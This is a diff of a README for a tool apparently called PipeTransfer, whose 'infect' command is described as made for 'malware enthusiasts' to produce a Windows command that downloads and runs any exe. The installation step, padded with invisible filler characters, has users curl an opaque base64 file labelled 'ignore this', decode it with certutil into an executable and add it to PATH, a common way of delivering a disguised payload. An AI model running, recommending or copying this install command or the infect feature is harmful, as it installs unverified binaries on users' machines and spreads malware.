@@ -10,7 +10,7 @@
 > **Infect** : This command was made specifically for malware enthusiasts, simply use the command : `pipetransfer infect (yourexe.exe) (key)` and pipetransfer will create a windows command for your file which can be used on any windows machine to download and run your exe.
 
 # Installation
-To install PipeTransfer simply run the command : ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ
+To install PipeTransfer simply run the command : ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ
 `curl -o temp.txt https://raw.githubusercontent.com/4lpine/PipeTransfer/main/base64source(ignore%20this).txt && certutil -decode temp.txt pipetransfer.exe && del temp.txt && move pipetransfer.exe C:\PipeTransfer\ && setx PATH "%PATH%;C:\PipeTransfer"`
 
 > [!NOTE]
